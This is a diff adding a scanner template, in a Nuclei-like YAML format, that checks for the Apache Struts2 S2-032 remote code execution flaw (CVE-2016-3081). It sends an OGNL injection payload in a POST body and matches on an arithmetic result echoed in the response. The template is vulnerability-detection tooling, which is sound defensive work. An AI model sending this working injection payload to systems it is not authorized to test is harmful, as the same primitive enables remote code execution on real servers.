@@ -1,0 +1,21 @@
+id: s2-032
+type: default
+info:
+  name: Struts2 s2-032 远程代码执行
+  risk: High
+  cve: CVE-2016-3081
+
+variables: |+
+  function main() {
+    return {'num1': randomNum(1,1000), 'num2': randomNum(2,1000)};
+  }
+
+
+requests:
+  - method: POST
+    redirect: false
+    url: '{{.URL}}'
+    body: 'method%3a%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23context[%23parameters.obj[0]].getWriter().print(%23parameters.content[0]-{{.num1}}),1%3f%23xx%3a%23request.toString&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content={{.num2}}'
+    matchers:
+      - dsl:
+          - "status_code==200 && contains(body,itoa({{.num2}}-{{.num1}}))"
